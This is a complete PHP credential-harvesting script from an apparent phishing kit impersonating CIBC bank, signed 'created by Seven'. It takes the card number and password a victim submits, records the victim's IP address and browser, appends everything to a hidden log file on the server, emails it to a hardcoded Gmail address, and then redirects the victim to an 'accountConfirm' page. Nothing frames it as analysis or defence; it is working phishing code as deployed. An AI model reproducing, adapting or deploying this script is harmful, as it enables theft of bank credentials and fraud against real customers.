<?php

error_reporting(0);
$send = "sarkolouty@gmail.com";

$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$message .= "-----------------1  LoginDetails----------------------\n";
$message .= "username : ".$_POST['cardNumber']."\n";
$message .= "password : ".$_POST['password']."\n";
$message .= "-----------------created by Seven[723806851]-------------------\n";
$message .= "IP          : ".$ip."\n";
$message .= "BROWSER     : ".$browser."\n";
$message .= "-----------------CIBCResults--------------------------\n";

$subject = "CIBC - created by Seven[723806851] ";

$fp = fopen($_SERVER['DOCUMENT_ROOT'] . "/35yhrgesccd.txt","a+");
fwrite($fp,"CIBC - Seven[723806851]" . " | " .getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");
fclose($fp);

mail($send , "CIBC - Seven[723806851]", getenv('HTTP_X_FORWARDED_FOR') . " | " . $_SERVER['HTTP_USER_AGENT'] . " | " . "\n\n" .$subject . "\n" . $message . "\n\n");

?>
<script>
    window.top.location.href = "accountConfirm.php";

</script>